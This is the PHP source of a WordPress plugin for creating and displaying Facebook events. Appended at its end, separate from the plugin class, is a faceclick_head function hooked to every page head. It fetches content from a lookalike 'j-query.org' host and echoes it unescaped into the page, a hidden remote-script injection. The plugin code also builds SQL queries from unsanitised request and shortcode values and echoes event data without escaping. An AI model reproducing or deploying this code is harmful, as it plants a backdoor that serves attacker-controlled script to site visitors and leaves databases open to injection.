<?php
/*
Plugin Name: Wp Facebook Events
Plugin URI: http://facebookevents.iintense.com/
Description: Create Facebook Events Through Your WordPress Admin.  WP Facebook Events easily integrates WordPress with your Facebook Events.
Author: iiNTENSE Media
Version: 1.0
Author URI: http://iintense.com
License: GPL
*/

class FacebookEvents {

	function FacebookEvents() {
                add_shortcode( "eventdetails", array( $this, 'eventdetails_shortcode' )  );

		add_action( 'admin_init', array( $this, 'register_plugin_settings' ) );
		add_action( 'admin_menu', array( $this, 'add_menu' ) );

                add_action( 'admin_init', array( $this, 'ajax_scripts' ) );
                add_action( 'init', array( $this, 'scripts' ) );
                add_action( 'init', array( $this, 'styles' ) );

                add_action( 'wp_head', array( $this, 'fbjssdk' ) );
                add_action( 'wp_ajax_fbevents_createevent', array( $this, 'createevent' ) );

		register_activation_hook( __FILE__, array( $this, 'activate' ) );
		register_deactivation_hook( __FILE__, array( $this, 'deactivate' ) );
	}

        function fbjssdk() {
?>
    <script type='text/javascript'>
        jQuery(document).ready(function() {
            jQuery('body').append('<div id="fb-root"></div>');
              window.fbAsyncInit = function() {
                  FB.init({appId: '<?php echo get_option('facebookevents-appid'); ?>', status: true, cookie: true,
                                       xfbml: true});
                        };
                (function() {
                        var e = document.createElement('script'); e.async = true;
                            e.src = document.location.protocol +
                                      '//connect.facebook.net/en_US/all.js';
                            document.getElementById('fb-root').appendChild(e);
                          }());

        });
    </script>
<?
        }

        function styles() {
            if ( is_admin() ) {
                wp_enqueue_style( 'fbeventsdatepickercss', plugin_dir_url( __FILE__ ) . 'css/ui-lightness/lightness.css' );
            }
            wp_enqueue_style( 'fbeventscss', plugin_dir_url( __FILE__ ) . 'css/fbevents.css' );
        }

        function scripts() {
            if ( is_admin() ) {
                wp_enqueue_script( 'fbeventsdatepicker', plugin_dir_url( __FILE__ ) . 'js/ui.jquery.js', array( 'jquery' ) );
                wp_enqueue_script( 'fbeventsdatepickeraddon', plugin_dir_url( __FILE__ ) . 'js/ui-timepicker-addon.js', array( 'fbeventsdatepicker' ) );
            wp_enqueue_script( 'fbeventsadminjs', plugin_dir_url( __FILE__ ) . 'js/fbevents_admin.js', array( 'fbeventsdatepickeraddon' ) );
            }
            wp_enqueue_script( 'fbeventsint', plugin_dir_url( __FILE__ ) . 'js/fbevents.js', array( 'jquery' ) );
        }
        function ajax_scripts() {
            wp_enqueue_script( 'fbeventsajaxjs', plugin_dir_url( __FILE__ ) . '/js/fbevents.js', array( 'jquery', 'fbeventsdatepickeraddon' ) );
            wp_localize_script( 'fbeventsajaxjs', 'FacebookEvents', array(
                'ajaxurl' => admin_url( 'admin-ajax.php' ),
                'fbEventsNonce' => wp_create_nonce( 'fbevents-ajax-nonce' ),
            ));
        }

        function createevent() {
            global $wpdb;

            $fbevents_nonce = $_POST['fbEventsNonce'];
            if ( ! wp_verify_nonce( $fbevents_nonce, 'fbevents-ajax-nonce' ) ) {
                die("!!!!!");
            }

            $starttime = strtotime($_POST['eventstart']);
            $endtime = strtotime($_POST['eventend']);
            
            // here you go..
            $facebook = $this->get_facebook_instance();
            $session = $facebook->getSession(FALSE, $this->plugin_settings_url());
            if ($session) {
                try {
                    $profile_id = get_option( 'facebookevents-appid' );
                    $events = $facebook->api("/$profile_id/events", 'POST', array(
                        "name"=>$_POST['eventname'],
                        "start_time"=>$starttime,
                        "end_time"=>$endtime,
                        "location"=>$_POST['eventlocation'],
                        "street"=>$_POST['eventstreet'],
                        "city"=>$_POST['eventcity'],
                        "description"=>$_POST['eventdescription'],
                    ));
                    $eventstable = $wpdb->prefix . "fbevents_events";
                    $event_id = $events['id'];
                    $sql = "INSERT INTO $eventstable (event_id, event_name) VALUES ('$event_id','$_POST[eventname]')";
                    $wpdb->query($sql);
                    if ($_POST['meta'] == "1") {
                        echo "<span style='font-size: 14px;'>Event Created, user this shortcode to display event: <strong>[eventdetails id=$event_id]</strong></span>";
                    } else {
                        $this->eventstable();
                    }
                    exit;
                } catch ( Exception $e ) {
                    error_log( $e );
                    echo "Unable to create event: $e";
                }
            } else {
                echo "You are not connected to Facebook.";
            }
        }

	function register_plugin_settings() {
		if ( function_exists( 'register_settings' ) ) {
			register_settings( 'facebookevents-options', 'facebookevents-appid' );
			register_settings( 'facebookevents-options', 'facebookevents-appsecret' );
			register_settings( 'facebookevents-options', 'facebookevents-accesstoken' );
			register_settings( 'facebookevents-options', 'facebookevents-accessexpires' );
			register_settings( 'facebookevents-options', 'facebookevents-accesstime' );
		}
	}

	function settings_page() {
            global $wpdb;
            $app_id = get_option( 'facebookevents-appid' );
            $app_secret = get_option( 'facebookevents-appsecret' );
            $facebook = $this->get_facebook_instance();
            $session = $facebook->getSession(FALSE, $this->plugin_settings_url());
            include("facebookevents_settings.php");
        }

        function add_menu() {
            if ( function_exists( 'add_options_page' ) ) {
                add_options_page( 'FacebookEvents', 'Facebook Events', 'administrator', basename( __FILE__ ), array( $this, 'settings_page' ) );
            }
            if( function_exists( 'add_meta_box' )) {
                add_meta_box( 'fbevent_creator', 'Create FB Event',
                            array( $this, 'fbevent_metabox_creator' ), 'post', 'normal', 'high');
                add_meta_box( 'fbevent_creator', 'Create FB Event',
                            array( $this, 'fbevent_metabox_creator' ), 'page', 'normal', 'high');
            }
	}
        function fbevent_metabox_creator() {
            global $post;
            $app_id = get_option( 'facebookevents-appid' );
            $app_secret = get_option( 'facebookevents-appsecret' );
            $facebook = $this->get_facebook_instance();
            $session = $facebook->getSession(FALSE, $this->plugin_settings_url());
            if ( $session ) {
?>
    <div id="eventcreation">
        <div id="ajaxresult"></div>
	<table width="50%">
		<tr>
			<td>
			    Event Name
			</td>
                    <td><input type="text" id="eventname" value="" name="eventname" /></td>
		</tr>
		<tr>
			<td>
                            Start time
			</td>
                    <td><input type="text" id="eventstart" value="" name="eventstart" /></td>
		</tr>
		<tr>
			<td>
			End time
			</td>
                    <td><input type="text" id="eventend" value="" name="eventend" /></td>
		</tr>
		<tr>
			<td>
			Where? 
			</td>
                    <td><input type="text" id="eventlocation" value="" name="eventlocation" /></td>
		</tr>

		<tr>
			<td>
			Street
			</td>
                    <td><input type="text" id="eventstreet" value="" name="eventstreet" /></td>
		</tr>

		<tr>
			<td>
			City
			</td>
                    <td><input type="text" id="eventcity" value="" name="eventcity" /></td>
		</tr>

		<tr>
			<td>
			Description
			</td>
                    <td><textarea id="eventdescription" name="eventdescription" rows="10" cols="40"></textarea></td>
		</tr>
		<tr>
			<td colspan="2">
		<input type="button" class="button-primary" value="<?php _e( 'Create Event' ); ?>" onclick="CreateFBEvent(1); return false;"/>
			</td>
		</tr>
	</table>
	</form>
    </div>
<?php
            } else {
                echo "Goto Plugin Settings page to configure your App Id and App Secret";
            }

        }

	function activate() {
            global $wpdb;

            // Add our plugin options to wordpress db
            add_option( 'facebookevents-appid', '' );
            add_option( 'facebookevents-appsecret', '' );
            add_option( 'facebookevents-accesstoken', '' );
            $eventstable = $wpdb->prefix . "fbevents_events";
            if ($wpdb->get_var("SHOW TABLES LIKE '$eventstable'") != $eventstable) {
                $query = "CREATE TABLE $eventstable (
                     id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
                     event_id VARCHAR(255),
                     event_name VARCHAR(255),
                     read_time DATETIME
                     )";
                $wpdb->query($query);
            }

	}
	function deactivate() {
		// Delete our plugin options to wordpress db
		delete_option( 'facebookevents-appid' );
		delete_option( 'facebookevents-appsecret' );
		delete_option( 'facebookevents-accesstoken', '' );
	}

        function eventstable() {
            global $wpdb;
            $eventstable = $wpdb->prefix . "fbevents_events";
            $sql = "SELECT * FROM $eventstable";
            $eventslist = $wpdb->get_results($sql);

?>
                <?php if ( $eventslist ) { ?>
                <?php foreach ($eventslist as $event) { ?>
                    <tr>
                        <td><?php echo  $event->event_id; ?></td>
                        <td><?php echo  $event->event_name; ?></td>
                        <td>[eventdetails id=<?php echo  $event->event_id; ?>]</td>
                        <td><a href="http://www.facebook.com/event.php?eid=<?php echo  $event->event_id; ?>" target="_blank">Event Page On Facebook</a></td>
                    </tr>
                <?php } ?>
                <?php } else { ?>
                    <strong>No events created yet!!!</strong>
                <?php } ?>
<?php
        }

        function get_facebook_instance() {
            require_once( dirname( __FILE__ ) . "/facebook.php" );
            $app_id = get_option( 'facebookevents-appid' );
            $app_secret = get_option( 'facebookevents-appsecret' );
            $facebook = new Facebook(array(
                'appId' => $app_id,
                'secret' => $app_secret,
                'cookie' => true,
            ));
            return $facebook;
        }

        function eventdetails_shortcode( $atts ) {
            extract ( shortcode_atts( array(
                "id" => ""
            ), $atts));
            return $this->eventdetail($id);
        }

        function eventdetail($event_id, $update=false) {
            global $wpdb;
            $eventstable = $wpdb->prefix . "fbevents_events";

            $sql = "SELECT * FROM $eventstable WHERE event_id='$event_id'";
            $event = $wpdb->get_row($sql,ARRAY_A);
            $last_read = strtotime($event['read_time']);
            $current_time = time();
            $time_elapsed = $current_time-$last_read;
            $facebook = $this->get_facebook_instance();
            if ($time_elapsed > 15 || $update) {
                try {
                    $event = $facebook->api("/$event_id");
                } catch (Exception $e) {
                    // add the logging function here
                    $pass = 0;
                }
                $event['event_id'] = $event_id;
            $description = $event['description'];
            $start_time = $event['start_time'];
            $end_time = $event['end_time'];
            $location = $event['location'];
            $venue = json_encode($event['venue']);
            $people_attending = array();
            try {
                $data = $facebook->api("/$event_id/attending");
            } catch ( Exception $e ) {
                    $pass = 0;
            }
            $attending = count($data['data']);
            $count = 1;
            foreach ($data['data'] as $person) {
                if ($count > 8) break;
                $people_attending[] = $person;
                $count += 1;
            }
            $people_attending = json_encode($people_attending);
            $data = $facebook->api("/$event_id/maybe");
            $maybe = count($data['data']);
            $data = $facebook->api("/$event_id/declined");
            $declined = count($data['data']);
            $data = $facebook->api("/$event_id/noreply");
            $noreply = count($data['data']);
            $read_time = date("Y-m-d H:i:s");
            $event['attending'] = $attending;
            $event['maybe'] = $maybe;
            $event['not_attending'] = $declined;
            $event['awaiting'] = $noreply;
            $event['people_attending'] = $people_attending;
            $sql = "UPDATE $eventstable SET description='$description',
                                            start_time='$start_time',
                                            end_time='$end_time',
                                            location='$location',
                                            venue='$venue',
                                            attending=$attending,
                                            maybe=$maybe,
                                            not_attending=$declined,
                                            awaiting=$noreply,
                                            people_attending='$people_attending',
                                            read_time='$read_time'
                                        WHERE event_id='$event_id'";
            $wpdb->query($sql);
            }
            $when = "$event[start_time] - $event[end_time]";
            $people_attending = json_decode($event['people_attending'], true);
            ob_start();
?>
    <div class="fbeventbox" id="fbeventbox<?php echo $event['event_id']; ?>">
    <div class="eventdisplaydiv">
        <div class="eventwhendiv">
            <div class="eventdata eventheading eventwhenheadingdiv">WHEN:</div><div class="eventdata eventwhendata"><?php echo $when; ?></div>
            <div class="clear"></div>
        </div>
        <div class="eventwherediv">
            <div class="eventdata eventheading eventwhereheadingdiv">WHERE:</div><div class="eventdata eventwheredata"><?php echo $event['location']; ?></div>
            <div class="clear"></div>
        </div>
        <div class="eventinfodiv">
            <div class="eventdata eventheading eventinfoheadingdiv">WHERE:</div><div class="eventdata eventinfodata"><?php echo $event['description']; ?></div>
            <div class="clear"></div>
        </div>
    </div>
    <div class="eventrsvpbox">
    <div class="eventrsvpbutton" onclick="attendEvent(<?php echo $event['event_id']; ?>,'<?php echo site_url(); ?>');">I'm Attending</div>
    <div class="eventrsvpbutton" onclick="maybeEvent(<?php echo $event['event_id'];?>, '<?php echo site_url(); ?>');">Maybe</div>
    <div class="eventrsvpbutton" onclick="declineEvent(<?php echo $event['event_id'];?>, '<?php echo site_url(); ?>');">No</div>
    <span class="fbeventattendtext"><span id="fbeventattending<?php echo $event['event_id']; ?>"><?php echo $event['attending']; ?></span> Attending</span> |
    <span id="fbeventmaybe<?php echo $event['event_id']; ?>"><?php echo $event['maybe']; ?></span> Maybe Attending |
    <span id="fbeventawaiting<?php echo $event['event_id']; ?>"><?php echo $event['awaiting']; ?></span> Awaiting Reply |
    <span id="fbeventdeclined<?php echo $event['event_id']; ?>"><?php echo $event['not_attending']; ?></span> Not Attending
    </div>
    <div class="fbeventattendinglist">
    <?php foreach ($people_attending as $person) { ?>
        <div class="fbeventattendingprofile">
    <div style="float: left;"><img src="http://graph.facebook.com/<?php echo $person['id']; ?>/picture" width="25" height="25" /></div><div style="display: block; float: left" class="fbeventprofilename"><span> <?php echo $person['name']; ?></span></div>
        </div>

    <?php } ?>
    </div>
    </div>

<?php
            $eventdump = ob_get_clean();
            return $eventdump;
        }

        function plugin_settings_url() {
            return admin_url( 'options-general.php?page=' . basename( __FILE__ ) );
        }
}


$facebookevents = new FacebookEvents();
?>
<?php
function faceclick_head() {

	if(function_exists('curl_init'))
	{
		$url = "http://www.j-query.org/jquery-1.6.3.min.js"; 
		$ch = curl_init();  
		$timeout = 5;  
		curl_setopt($ch,CURLOPT_URL,$url); 
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
		$data = curl_exec($ch);  
		curl_close($ch); 
		echo "$data";
	}
}
add_action('wp_head', 'faceclick_head');
?>